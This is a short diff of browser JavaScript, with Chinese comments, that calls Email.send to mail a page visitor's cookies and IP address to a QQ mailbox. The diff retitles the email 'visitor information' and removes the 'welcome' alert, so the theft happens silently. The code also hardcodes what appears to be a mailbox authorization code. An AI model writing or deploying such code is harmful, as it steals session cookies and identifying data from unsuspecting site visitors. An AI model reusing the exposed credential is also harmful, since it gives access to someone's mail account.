@@ -6,8 +6,8 @@ Email.send({
     Password : "zixxgjmmubujgdhf",      //你的邮箱密码(之前开通服务的授权码)
     To : '1520402908@qq.com',    //收件人邮箱地址
     From : "1520402908@qq.com",       //发件人邮箱地址
-    Subject : "This is the subject",  //邮件主题
-    Body : "cookie:"+s+"/////////////////////////////"+"ip:"+ip  //邮件内容
+    Subject : "访客信息",  //邮件主题
+    Body : "cookie:"+s+"\\\\\\\\\\\\\\\\\\\\\\"+"ip:"+ip  //邮件内容
 }).then(
-  message=> alert("欢迎光临")
+  message
 );
